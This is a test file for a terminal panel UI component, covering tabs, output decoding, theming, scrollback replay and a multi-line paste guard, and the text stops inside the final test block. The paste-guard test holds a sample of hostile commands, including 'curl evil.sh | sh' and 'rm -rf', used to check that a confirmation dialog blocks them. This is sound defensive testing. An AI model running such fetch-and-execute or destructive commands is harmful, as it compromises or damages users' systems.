// Tests for the P1-5 D integrated terminal panel: open/close + Ctrl+`,
// tab management with the 4-instance cap, base64 output decoding into
// xterm, stdin dispatch, terminal:exit end-marking, history-warning hint,
// i18n key parity (en + zh-CN), the xterm theme mapping floor, plus the
// P2-4 gap coverage: resize→IPC, unmount cleanup (dispose/unsubscribe),
// the authoritative terminal_list merge, Ctrl+` over a focused surface,
// and persisted-settings application at xterm creation.
//
// jsdom cannot run the real xterm renderer — @xterm/xterm and
// @xterm/addon-fit are replaced with fakes that expose the same surface
// the panel uses (write/onData/onResize/open/dispose, fit). The event
// transports are captured from `listenTerminalOutput` /
// `listenTerminalExit` so tests drive the exact payload shapes the Rust
// pump emits (including the additive per-chunk `seq`); gates can hold the
// listen promises unresolved to pin the listener-before-history-fetch
// ordering (review fix).

import { describe, it, expect, vi, beforeEach } from 'vitest'
import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import { render, screen, fireEvent, waitFor, within, act } from '@testing-library/react'
import { TerminalPanel } from '@/components/terminal/TerminalPanel'
import { xtermThemeFor } from '@/components/terminal/xtermTheme'
import * as api from '@/lib/tauri-api'
import { decodeTerminalOutput } from '@/lib/runtime/terminalEvents'
import en from '@/i18n/locales/en.json'
import zhCN from '@/i18n/locales/zh-CN.json'
import type { TerminalInfo } from '@/types'
import { toast } from 'sonner'

// spawn failures surface through toastError (@/lib/errorToast → sonner).
vi.mock('sonner', () => ({
  toast: { success: vi.fn(), error: vi.fn(), info: vi.fn(), warning: vi.fn() },
}))

const h = vi.hoisted(() => ({
  terminals: [] as {
    written: Uint8Array[]
    options: Record<string, unknown>
    element: HTMLElement | null
    dataHandler: ((data: string) => void) | null
    resizeHandler: ((size: { cols: number; rows: number }) => void) | null
    /** US4: captured selection-change callback (xterm's carries no payload). */
    selectionHandler: (() => void) | null
    selection: string
    open: (container: HTMLElement) => void
    loadAddon: (addon: unknown) => void
    scrollToBottom: () => void
    focus: () => void
    dispose: () => void
    disposed: boolean
    write: (data: string | Uint8Array) => void
    onData: (cb: (data: string) => void) => { dispose: () => void }
    onResize: (cb: (size: { cols: number; rows: number }) => void) => { dispose: () => void }
    onSelectionChange: (cb: () => void) => { dispose: () => void }
    getSelection: () => string
  }[],
  /** Every FitAddon the panel created, in creation order. */
  fits: [] as {
    fit: () => void
    dispose: () => void
    disposed: boolean
  }[],
  outputHandler: null as ((payload: { terminalId: string; data: string; seq?: number }) => void) | null,
  exitHandler: null as ((payload: { terminalId: string }) => void) | null,
  unsubscribed: false,
  exitUnsubscribed: false,
  /** Review fix: gates to hold the listener promises unresolved so tests
   *  can observe the listener-before-history-fetch ordering. Null (the
   *  default) resolves immediately, like the real transports. */
  gateOutput: null as Promise<void> | null,
  gateExit: null as Promise<void> | null,
}))

/** What xterm would render: every written chunk re-decoded as one stream. */
function rendered(term: (typeof h.terminals)[number]): string {
  const total = term.written.reduce((n, c) => n + c.length, 0)
  const all = new Uint8Array(total)
  let offset = 0
  for (const chunk of term.written) {
    all.set(chunk, offset)
    offset += chunk.length
  }
  return new TextDecoder('utf-8', { fatal: false }).decode(all)
}

vi.mock('@xterm/xterm', () => ({
  Terminal: class {
    written: string[] = []
    options: Record<string, unknown> = {}
    element: HTMLElement | null = null
    dataHandler: ((data: string) => void) | null = null
    resizeHandler: ((size: { cols: number; rows: number }) => void) | null = null
    selectionHandler: (() => void) | null = null
    selection = ''
    constructor(options: Record<string, unknown>) {
      this.options = options
      h.terminals.push(this)
    }
    write(data: string | Uint8Array) {
      this.written.push(typeof data === 'string' ? new TextEncoder().encode(data) : data)
    }
    onData(cb: (data: string) => void) {
      this.dataHandler = cb
      return { dispose: () => {} }
    }
    onResize(cb: (size: { cols: number; rows: number }) => void) {
      this.resizeHandler = cb
      return { dispose: () => {} }
    }
    onSelectionChange(cb: () => void) {
      this.selectionHandler = cb
      return { dispose: () => {} }
    }
    getSelection() {
      return this.selection
    }
    open(container: HTMLElement) {
      this.element = document.createElement('div')
      this.element.dataset.fake = 'xterm'
      container.appendChild(this.element)
    }
    loadAddon() {}
    scrollToBottom() {}
    focus() {}
    // P2-4: dispose is a spy target — unmount cleanup must run it.
    disposed = false
    dispose() { this.disposed = true }
  },
}))

vi.mock('@xterm/addon-fit', () => ({
  FitAddon: class {
    disposed = false
    constructor() {
      h.fits.push(this)
    }
    fit() { /* jsdom has no layout */ }
    // P2-4: dispose is a spy target — unmount cleanup must run it.
    dispose() { this.disposed = true }
  },
}))

vi.mock('@/lib/tauri-api', () => ({
  terminalSpawn: vi.fn(),
  terminalWrite: vi.fn(),
  terminalResize: vi.fn(),
  terminalKill: vi.fn(),
  terminalList: vi.fn(),
  terminalGetSettings: vi.fn(),
  terminalSetSettings: vi.fn(),
  terminalHistory: vi.fn(),
}))

const DEFAULT_SETTINGS = { shell: null, fontSize: 12, scrollback: 5000, drawerHeight: 320, screenReaderMode: false }

vi.mock('@/lib/runtime/terminalEvents', async () => {
  const actual = await import('@/lib/runtime/terminalEvents')
  return {
    ...actual,
    listenTerminalOutput: (handler: (payload: { terminalId: string; data: string; seq?: number }) => void) => {
      h.outputHandler = handler
      h.unsubscribed = false
      return (h.gateOutput ?? Promise.resolve()).then(() => () => {
        h.unsubscribed = true
      })
    },
    listenTerminalExit: (handler: (payload: { terminalId: string }) => void) => {
      h.exitHandler = handler
      h.exitUnsubscribed = false
      return (h.gateExit ?? Promise.resolve()).then(() => () => {
        h.exitUnsubscribed = true
      })
    },
  }
})

// base64 helpers matching the Rust wire format
function encode(raw: string): string {
  const bytes = new TextEncoder().encode(raw)
  let binary = ''
  bytes.forEach(b => { binary += String.fromCharCode(b) })
  return btoa(binary)
}

// The panel reads `<html data-theme>` (no ThemeProvider needed) — tests
// render it bare and set the attribute directly where relevant.

function info(id: string, dir = '/home/u/demo'): TerminalInfo {
  return { terminalId: id, projectDir: dir, shell: '/bin/bash', startedAtMs: 1_000 }
}

beforeEach(() => {
  vi.clearAllMocks()
  document.documentElement.removeAttribute('data-theme')
  h.terminals.length = 0
  h.fits.length = 0
  h.outputHandler = null
  h.exitHandler = null
  h.gateOutput = null
  h.gateExit = null
  localStorage.clear()
  vi.mocked(api.terminalList).mockResolvedValue([])
  vi.mocked(api.terminalGetSettings).mockResolvedValue({ ...DEFAULT_SETTINGS })
  vi.mocked(api.terminalSetSettings).mockResolvedValue({ ...DEFAULT_SETTINGS })
  // US6 replay: the demo contract answers empty (nothing to restore).
  vi.mocked(api.terminalHistory).mockResolvedValue({ data: '' })
  vi.mocked(api.terminalSpawn).mockImplementation(async (dir?: string | null) => {
    return { terminalId: `t-${h.terminals.length + 1}-${(dir ?? '').length}` }
  })
  vi.mocked(api.terminalWrite).mockResolvedValue(undefined)
  vi.mocked(api.terminalResize).mockResolvedValue(undefined)
  vi.mocked(api.terminalKill).mockResolvedValue(undefined)
})

async function openPanel() {
  render(<TerminalPanel projectDir="/home/u/demo" />)
  fireEvent.keyDown(window, { key: '`', ctrlKey: true })
  await screen.findByRole('region', { name: 'Integrated terminal' })
}

describe('TerminalPanel (open/close)', () => {
  it('renders collapsed with an accessible toggle', () => {
    render(<TerminalPanel projectDir="/home/u/demo" />)
    const toggle = screen.getByRole('button', { name: /toggle terminal/i })
    expect(toggle.getAttribute('aria-expanded')).toBe('false')
    expect(screen.queryByRole('region')).toBeNull()
  })

  it('Ctrl+` opens the panel and spawns the first terminal', async () => {
    await openPanel()
    await waitFor(() => expect(api.terminalSpawn).toHaveBeenCalledWith('/home/u/demo'))
    await waitFor(() => expect(screen.getAllByRole('tab').length).toBe(1))
    // The spawn tab is derived from the passed projectDir.
    expect(screen.getByRole('tab', { name: /demo/ })).toBeTruthy()
  })

  it('Ctrl+` also closes the panel again', async () => {
    await openPanel()
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    await waitFor(() => {
      expect(screen.queryByRole('region', { name: 'Integrated terminal' })).toBeNull()
    })
  })

  it('reconciles live terminals from terminal_list on first open', async () => {
    vi.mocked(api.terminalList).mockResolvedValue([info('t-live-1'), info('t-live-2')])
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    await waitFor(() => expect(screen.getAllByRole('tab').length).toBe(2))
    // No duplicate spawn when live terminals exist.
    expect(api.terminalSpawn).not.toHaveBeenCalled()
  })

  it('restores reconnected tabs silently (replay replaced the history-warning banner)', async () => {
    // US6: scrollback comes back via terminal_history, so the old
    // "output history can't be recovered" notice is gone for good.
    vi.mocked(api.terminalList).mockResolvedValue([info('t-live-1')])
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    await screen.findByRole('tab', { name: /demo/ })
    expect(screen.queryByText(/output history/i)).toBeNull()
    expect(screen.queryByRole('status')).toBeNull()
  })

  it('shows the full-height toggle as aria-pressed', async () => {
    await openPanel()
    const full = screen.getByRole('button', { name: /full-height/i })
    expect(full.getAttribute('aria-pressed')).toBe('false')
    fireEvent.click(full)
    expect(full.getAttribute('aria-pressed')).toBe('true')
  })
})

describe('TerminalPanel (output + input)', () => {
  it('decodes base64 terminal:output into raw bytes for xterm, id-filtered', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    // Mismatched id must be ignored; matching id decoded (base64 → raw
    // bytes) and written into the xterm buffer untouched.
    h.outputHandler?.({ terminalId: 'other-terminal', data: encode('not-for-you') })
    h.outputHandler?.({ terminalId: terminalId, data: encode('pty-bytes-✓') })
    const seen = rendered(h.terminals[0])
    expect(seen).not.toContain('not-for-you')
    expect(seen).toContain('pty-bytes-✓')
  })

  it('reassembles multi-byte sequences split across events without U+FFFD', async () => {
    // The 16 ms pump slices the pty stream at arbitrary byte boundaries:
    // "中文输出✓" (UTF-8, 3 bytes/CJK char) is cut mid-sequence across
    // three events. xterm must receive BYTES so its write buffer completes
    // the partial sequences — per-event string decoding would corrupt
    // both halves into U+FFFD.
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    const full = new TextEncoder().encode('中文输出✓')
    const cuts = [full.subarray(0, 2), full.subarray(2, 5), full.subarray(5)]
    for (const piece of cuts) {
      let binary = ''
      piece.forEach(b => { binary += String.fromCharCode(b) })
      h.outputHandler?.({ terminalId, data: btoa(binary) })
    }
    const seen = rendered(h.terminals[0])
    expect(seen).toBe('中文输出✓')
    expect(seen.includes('\uFFFD')).toBe(false)
  })

  it('routes xterm onData to terminal_write', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals[0]).toBeTruthy())
    h.terminals[0].dataHandler?.('ls\r')
    await waitFor(() => expect(api.terminalWrite).toHaveBeenCalledWith(
      expect.any(String), 'ls\r',
    ))
  })

  it('marks the tab ended when the terminal:exit event arrives', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    act(() => { h.exitHandler?.({ terminalId }) })
    expect(await screen.findByText(/ended/)).toBeTruthy()
  })

  it('does not mark the tab ended when output merely prints the exit notice text', async () => {
    // P3-6: the in-stream "[shannon: process exited …" notice is display
    // text — any program can print it, so it must never flip the tab.
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    h.outputHandler?.({
      terminalId,
      data: encode('\r\n\x1b[2m[shannon: process exited — done]\x1b[0m\r\n'),
    })
    await new Promise((r) => setTimeout(r, 25))
    // The notice itself still reaches xterm untouched (it is for humans).
    // Asserted FIRST: if it never rendered, the negative assertion below
    // would hold vacuously — the ordering closes that pass window.
    expect(rendered(h.terminals[0])).toContain('[shannon: process exited')
    expect(screen.queryByText(/ended/)).toBeNull()
  })

  it('drops a malformed base64 payload with a warning and keeps the stream alive', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    try {
      // Unit: the decode itself never throws.
      expect(decodeTerminalOutput('!!!not-base64!!!').length).toBe(0)
      expect(warn).toHaveBeenCalledOnce()
    } finally {
      warn.mockRestore()
    }
    // Through the panel handler: one bad payload must not break the
    // subscription — the next good payload still reaches xterm.
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    const warnDuring = vi.spyOn(console, 'warn').mockImplementation(() => {})
    try {
      h.outputHandler?.({ terminalId, data: '!!!not-base64!!!' })
      h.outputHandler?.({ terminalId, data: encode('still-alive') })
    } finally {
      warnDuring.mockRestore()
    }
    expect(rendered(h.terminals[0])).toContain('still-alive')
  })
})

describe('TerminalPanel (tab management)', () => {
  it('spawns additional terminals via + and closes them with ×', async () => {
    await openPanel()
    await waitFor(() => expect(screen.getAllByRole('tab').length).toBe(1))
    const plus = screen.getByRole('button', { name: 'New terminal' })
    fireEvent.click(plus)
    await waitFor(() => expect(screen.getAllByRole('tab').length).toBe(2))
    expect(api.terminalSpawn).toHaveBeenCalledTimes(2)

    const closeButtons = screen.getAllByRole('button', { name: /close terminal:/i })
    fireEvent.click(closeButtons[0])
    await waitFor(() => expect(api.terminalKill).toHaveBeenCalledTimes(1))
    await waitFor(() => expect(screen.getAllByRole('tab').length).toBe(1))
  })

  it('marks + aria-disabled at the 4-terminal cap, and a capped click announces the limit', async () => {
    // P2-3/P3-4: the + button stays clickable (aria-disabled, not
    // disabled) so a capped click can trigger the aria-live feedback —
    // a disabled button can neither explain nor be asked why.
    vi.mocked(api.terminalList).mockResolvedValue([
      info('t-1'), info('t-2'), info('t-3'), info('t-4'),
    ])
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    const plus = await screen.findByRole('button', { name: 'New terminal' })
    await waitFor(() => expect(screen.getAllByRole('tab').length).toBe(4))
    expect(plus.getAttribute('aria-disabled')).toBe('true')
    expect(plus.getAttribute('title')).toContain('limit reached (4)')

    // Nothing spawns, and the limit is announced through the live region.
    fireEvent.click(plus)
    expect(api.terminalSpawn).not.toHaveBeenCalled()
    expect(screen.getByText(/limit reached \(4\)/)).toBeTruthy()
  })

  it('keeps only the active tab in the tab order and moves selection with the arrow keys', async () => {
    // P2-3: WAI-ARIA tabs roving tabindex — ArrowRight/Left move the
    // selection with wrapping, Home/End jump to the first/last tab.
    // projectDir={null} shows all terminals (US7) so the three tabs here
    // exercise the full tablist regardless of their projects.
    vi.mocked(api.terminalList).mockResolvedValue([info('t-a'), info('t-b', '/other'), info('t-c', '/third')])
    render(<TerminalPanel projectDir={null} />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    const tabA = await screen.findByRole('tab', { name: /demo/ })
    const tabB = await screen.findByRole('tab', { name: /other/ })
    const tabC = await screen.findByRole('tab', { name: /third/ })
    // Newest listed terminal is selected initially.
    expect(tabC.getAttribute('aria-selected')).toBe('true')
    expect(tabC.getAttribute('tabindex')).toBe('0')
    expect(tabA.getAttribute('tabindex')).toBe('-1')
    expect(tabB.getAttribute('tabindex')).toBe('-1')
    // ArrowLeft steps to the previous tab.
    fireEvent.keyDown(tabC, { key: 'ArrowLeft' })
    await waitFor(() => expect(tabB.getAttribute('aria-selected')).toBe('true'))
    expect(tabB.getAttribute('tabindex')).toBe('0')
    expect(tabC.getAttribute('tabindex')).toBe('-1')
    // …and wraps past the first tab back to the last.
    fireEvent.keyDown(tabB, { key: 'Home' })
    await waitFor(() => expect(tabA.getAttribute('aria-selected')).toBe('true'))
    fireEvent.keyDown(tabA, { key: 'ArrowLeft' })
    await waitFor(() => expect(tabC.getAttribute('aria-selected')).toBe('true'))
    // End jumps back to the last tab.
    fireEvent.keyDown(tabA, { key: 'End' })
    await waitFor(() => expect(tabC.getAttribute('aria-selected')).toBe('true'))
  })

  it('wires the active tab to the terminal surface via aria-controls/aria-labelledby', async () => {
    // P2-3: the terminal surface is the tabpanel; the active tab names it
    // and it names the active tab back. projectDir={null} keeps both tabs
    // visible (US7) so the labelledby pair can flip between them.
    vi.mocked(api.terminalList).mockResolvedValue([info('t-a'), info('t-b', '/other')])
    render(<TerminalPanel projectDir={null} />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    const tabB = await screen.findByRole('tab', { name: /other/ })
    const surface = screen.getByTestId('terminal-surface')
    expect(surface.getAttribute('role')).toBe('tabpanel')
    expect(surface.getAttribute('id')).toBe('terminal-tab-panel')
    expect(tabB.getAttribute('aria-controls')).toBe('terminal-tab-panel')
    expect(surface.getAttribute('aria-labelledby')).toBe(tabB.getAttribute('id'))
    fireEvent.click(await screen.findByRole('tab', { name: /demo/ }))
    await waitFor(() =>
      expect(screen.getByTestId('terminal-surface').getAttribute('aria-labelledby'))
        .toBe(screen.getByRole('tab', { name: /demo/ }).getAttribute('id')),
    )
  })

  it('switches tabs on click', async () => {
    // projectDir={null} keeps both tabs visible (US7) for a pure
    // click-to-select check.
    vi.mocked(api.terminalList).mockResolvedValue([info('t-a'), info('t-b', '/other')])
    render(<TerminalPanel projectDir={null} />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    const tabA = await screen.findByRole('tab', { name: /demo/ })
    const tabB = await screen.findByRole('tab', { name: /other/ })
    // The newest listed terminal is selected initially (openPanel picks
    // the last entry, oldest-first ordering from the backend).
    expect(tabB.getAttribute('aria-selected')).toBe('true')
    fireEvent.click(tabA)
    await waitFor(() => expect(tabA.getAttribute('aria-selected')).toBe('true'))
    expect(tabB.getAttribute('aria-selected')).toBe('false')
  })
})

describe('TerminalPanel (i18n + theme)', () => {
  it('en and zh-CN define the same terminal.* keys', () => {
    const enKeys = Object.keys(en).filter(k => k.startsWith('terminal.')).sort()
    const zhKeys = Object.keys(zhCN).filter(k => k.startsWith('terminal.')).sort()
    expect(enKeys.length).toBeGreaterThan(5)
    expect(zhKeys).toEqual(enKeys)
  })

  it('retired the history-warning keys with the replay banner (US6)', () => {
    // No locale may still carry them…
    for (const locale of [en, zhCN]) {
      expect('terminal.historyWarning' in locale).toBe(false)
      expect('terminal.panel.dismissHint' in locale).toBe(false)
    }
    // …and the panel source must have no dangling references (the parity
    // test above only guards en↔zh-CN). Same cwd-relative read as
    // i18nCheck.test.ts.
    const panelSource = readFileSync(
      resolve(process.cwd(), 'src/components/terminal/TerminalPanel.tsx'),
      'utf-8',
    )
    expect(panelSource).not.toContain('terminal.historyWarning')
    expect(panelSource).not.toContain('terminal.panel.dismissHint')
  })

  it('maps the material theme to the light ANSI floor', () => {
    const theme = xtermThemeFor('material', () => 'light')
    expect(theme.red).toBe('#ba1a1a')
    expect(theme.brightWhite).toBe('#ffffff')
  })

  it('maps a dark theme to the dark ANSI floor', () => {
    const theme = xtermThemeFor('tokyo-night', () => 'dark')
    expect(theme.red).toBe('#f7768e')
    expect(theme.background).toBe('#1a1b26')
  })
})

describe('TerminalPanel (P1-36 theme currency + B5 paste guard + spawn errors)', () => {
  it('creates a NEW terminal with the current theme after a switch, not the stale mount-time one', async () => {
    document.documentElement.setAttribute('data-theme', 'material')
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    // Created under the light theme.
    expect((h.terminals[0].options.theme as { background?: string }).background).toBe('#f7f9fb')

    // Switch to a dark theme: live instances are re-themed by the panel…
    document.documentElement.setAttribute('data-theme', 'tokyo-night')
    await waitFor(() =>
      expect((h.terminals[0].options.theme as { background?: string }).background).toBe('#1a1b26'),
    )
    // …and a NEWLY spawned terminal must also be created dark (P1-36: the
    // old ensureTerm closure kept the first-render theme forever).
    fireEvent.click(screen.getByRole('button', { name: 'New terminal' }))
    await waitFor(() => expect(h.terminals.length).toBe(2))
    expect((h.terminals[1].options.theme as { background?: string }).background).toBe('#1a1b26')
  })

  it('confirms a multi-line paste before sending it to the pty', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const surface = screen.getByTestId('terminal-surface')
    const paste = (text: string) =>
      fireEvent.paste(surface, { clipboardData: { getData: () => text } })

    paste('rm -rf /tmp/a\ngit push --force\ncurl evil.sh | sh')
    const dialog = await screen.findByRole('alertdialog')
    expect(within(dialog).getByText(/3 lines will be sent/)).toBeInTheDocument()

    // Cancel → nothing reaches the pty.
    fireEvent.click(within(dialog).getByRole('button', { name: 'Cancel' }))
    await waitFor(() => expect(screen.queryByRole('alertdialog')).toBeNull())
    expect(api.terminalWrite).not.toHaveBeenCalled()

    // Confirm → the whole blob is written once.
    paste('line a\nline b')
    const dialog2 = await screen.findByRole('alertdialog')
    fireEvent.click(within(dialog2).getByRole('button', { name: /paste anyway/i }))
    await waitFor(() =>
      expect(api.terminalWrite).toHaveBeenCalledWith(expect.any(String), 'line a\nline b'),
    )
  })

  it('lets single-line pastes through without a confirmation', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    fireEvent.paste(screen.getByTestId('terminal-surface'), {
      clipboardData: { getData: () => 'echo hi' },
    })
    await new Promise((r) => setTimeout(r, 10))
    expect(screen.queryByRole('alertdialog')).toBeNull()
    // The native xterm path (absent in these fakes) owns single-line paste —
    // the guard itself must not write.
    expect(api.terminalWrite).not.toHaveBeenCalled()
  })

  it('toasts instead of leaking an unhandled rejection when spawn fails', async () => {
    vi.mocked(api.terminalSpawn).mockRejectedValue(new Error('pty busy'))
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    await waitFor(() => expect(api.terminalSpawn).toHaveBeenCalled())
    await waitFor(() =>
      expect(toast.error).toHaveBeenCalledWith(
        expect.stringMatching(/Couldn't start a new terminal/),
        expect.objectContaining({ description: expect.stringMatching(/pty busy/) }),
      ),
    )
  })
})

describe('TerminalPanel (chat integration: run in terminal — US4 direction A)', () => {
  const runEvent = (code: unknown) =>
    act(() => {
      window.dispatchEvent(new CustomEvent('shannon:terminal-run', { detail: { code } }))
    })

  it('opens the closed drawer, spawns the first tab and writes code + newline', async () => {
    render(<TerminalPanel projectDir="/home/u/demo" />)
    expect(screen.queryByRole('region', { name: 'Integrated terminal' })).toBeNull()
    runEvent('npm test')
    expect(await screen.findByRole('region', { name: 'Integrated terminal' })).toBeTruthy()
    await waitFor(() => expect(api.terminalSpawn).toHaveBeenCalledTimes(1))
    await waitFor(() =>
      expect(api.terminalWrite).toHaveBeenCalledWith(expect.any(String), 'npm test\n'),
    )
  })

  it('writes into the existing active tab without spawning a duplicate', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    expect(api.terminalSpawn).toHaveBeenCalledTimes(1)
    runEvent('echo hi')
    await waitFor(() => expect(api.terminalWrite).toHaveBeenCalledWith(terminalId, 'echo hi\n'))
    // Still exactly one spawn — the existing tab is reused.
    expect(api.terminalSpawn).toHaveBeenCalledTimes(1)
  })

  it('spawns when the drawer is open but every tab is gone', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    // Close the only tab: the drawer stays open over the empty state.
    fireEvent.click(screen.getByRole('button', { name: /close terminal:/i }))
    await waitFor(() => expect(screen.queryAllByRole('tab')).toHaveLength(0))
    runEvent('ls -la')
    await waitFor(() => expect(api.terminalSpawn).toHaveBeenCalledTimes(2))
    await waitFor(() =>
      expect(api.terminalWrite).toHaveBeenCalledWith(expect.any(String), 'ls -la\n'),
    )
  })

  it('ignores malformed payloads (non-string or empty code)', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    expect(api.terminalSpawn).toHaveBeenCalledTimes(1) // the boot spawn
    runEvent(undefined)
    runEvent('')
    await new Promise((r) => setTimeout(r, 25))
    expect(api.terminalWrite).not.toHaveBeenCalled()
    expect(api.terminalSpawn).toHaveBeenCalledTimes(1)
  })
})

describe('TerminalPanel (chat integration: selection → composer — US4)', () => {
  /** Drive a selection change the way real xterm does: mutate the instance
   *  selection, then fire the (payload-less) onSelectionChange callback. */
  const select = (term: (typeof h.terminals)[number], text: string) => {
    term.selection = text
    act(() => { term.selectionHandler?.() })
  }

  it('keeps the send-to-agent button disabled without a selection', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    expect(screen.getByRole('button', { name: 'Send to agent' })).toBeDisabled()
  })

  it('enables on a non-empty selection and prefills the composer via shannon:composer-prefill', async () => {
    const seen = vi.fn()
    window.addEventListener('shannon:composer-prefill', seen)
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const button = screen.getByRole('button', { name: 'Send to agent' })
    select(h.terminals[0], 'npm ERR! missing script')
    await waitFor(() => expect(button).toBeEnabled())

    fireEvent.click(button)
    window.removeEventListener('shannon:composer-prefill', seen)
    expect(seen).toHaveBeenCalledTimes(1)
    const detail = (seen.mock.calls[0][0] as CustomEvent).detail
    // The selection is quoted as a fenced block, verbatim.
    expect(detail.text).toBe('```\nnpm ERR! missing script\n```')
  })

  it('disables again when the selection is cleared', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const button = screen.getByRole('button', { name: 'Send to agent' })
    select(h.terminals[0], 'some output')
    await waitFor(() => expect(button).toBeEnabled())
    select(h.terminals[0], '')
    await waitFor(() => expect(button).toBeDisabled())
  })

  it('ignores selection changes on background tabs', async () => {
    // Distinct dirs give the tabs distinct accessible names; projectDir
    // null shows both (US7) — this test is about selection, not filtering.
    vi.mocked(api.terminalList).mockResolvedValue([info('t-a', '/home/u/demo-a'), info('t-b', '/home/u/demo-b')])
    render(<TerminalPanel projectDir={null} />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    // Newest listed terminal (t-b) is selected and mounts first.
    await waitFor(() => expect(h.terminals.length).toBe(1))
    // Make t-a active so its term exists, then switch back to t-b.
    fireEvent.click(await screen.findByRole('tab', { name: /demo-a/ }))
    await waitFor(() => expect(h.terminals.length).toBe(2))
    fireEvent.click(screen.getByRole('tab', { name: /demo-b/ }))
    await waitFor(() =>
      expect(screen.getByRole('tab', { name: /demo-b/ }).getAttribute('aria-selected')).toBe('true'),
    )
    // A selection in the now-background t-a must not enable the button.
    select(h.terminals[1], 'hidden selection')
    await new Promise((r) => setTimeout(r, 25))
    expect(screen.getByRole('button', { name: 'Send to agent' })).toBeDisabled()
  })

  it('re-derives the button state when switching between tabs', async () => {
    // projectDir null keeps both tabs visible (US7) — selection-scope only.
    vi.mocked(api.terminalList).mockResolvedValue([info('t-a', '/home/u/demo-a'), info('t-b', '/home/u/demo-b')])
    render(<TerminalPanel projectDir={null} />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    await waitFor(() => expect(h.terminals.length).toBe(1))
    // Switch to t-a and select there — the button enables for the tab the
    // user is looking at.
    fireEvent.click(await screen.findByRole('tab', { name: /demo-a/ }))
    await waitFor(() => expect(h.terminals.length).toBe(2))
    select(h.terminals[1], 'selected in t-a')
    await waitFor(() => expect(screen.getByRole('button', { name: 'Send to agent' })).toBeEnabled())
    // Switching back to t-b (no selection) must re-derive → disabled again,
    // even though t-a still holds its selection.
    fireEvent.click(screen.getByRole('tab', { name: /demo-b/ }))
    await waitFor(() => expect(screen.getByRole('button', { name: 'Send to agent' })).toBeDisabled())
  })
})

describe('TerminalPanel (scrollback replay — US6)', () => {
  it('writes the history snapshot BEFORE live bytes that arrive during the fetch', async () => {
    // The backend appends to the ring before emitting, so the snapshot is
    // a clean prefix of the live stream; the panel must preserve that
    // order across the async fetch by queueing in-between live payloads.
    let resolveHistory: (v: { data: string }) => void = () => {}
    vi.mocked(api.terminalHistory).mockImplementation(
      () => new Promise((resolve) => { resolveHistory = resolve }),
    )
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    // Live byte arrives while the fetch is in flight → queued, not written.
    h.outputHandler?.({ terminalId, data: encode('LIVE-DURING-FETCH') })
    expect(rendered(h.terminals[0])).toBe('')
    resolveHistory({ data: encode('HISTORY-PREFIX') })
    // Asserted as one rendered stream: snapshot first, queued live second.
    await waitFor(() =>
      expect(rendered(h.terminals[0])).toBe('HISTORY-PREFIXLIVE-DURING-FETCH'),
    )
  })

  it('fetches the replay once per tab and passes live bytes straight through afterwards', async () => {
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    await waitFor(() => expect(api.terminalHistory).toHaveBeenCalledWith(terminalId))
    h.outputHandler?.({ terminalId, data: encode('after-replay') })
    expect(rendered(h.terminals[0])).toBe('after-replay')
    expect(api.terminalHistory).toHaveBeenCalledTimes(1)
  })

  it('fetches the replay once per tab, even after switching away and back', async () => {
    vi.mocked(api.terminalList).mockResolvedValue([info('t-a', '/home/u/demo-a'), info('t-b', '/home/u/demo-b')])
    render(<TerminalPanel projectDir={null} />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    await waitFor(() => expect(h.terminals.length).toBe(1)) // t-b (newest) mounts
    fireEvent.click(await screen.findByRole('tab', { name: /demo-a/ }))
    await waitFor(() => expect(h.terminals.length).toBe(2)) // t-a mounts
    fireEvent.click(screen.getByRole('tab', { name: /demo-b/ }))
    await waitFor(() =>
      expect(screen.getByRole('tab', { name: /demo-b/ }).getAttribute('aria-selected')).toBe('true'),
    )
    // ensureTerm returned the existing entries for both switches — no
    // third fetch, and each id fetched exactly once.
    await new Promise((r) => setTimeout(r, 25))
    expect(api.terminalHistory).toHaveBeenCalledTimes(2)
    expect(vi.mocked(api.terminalHistory).mock.calls.map(c => c[0]).sort()).toEqual(['t-a', 't-b'])
  })

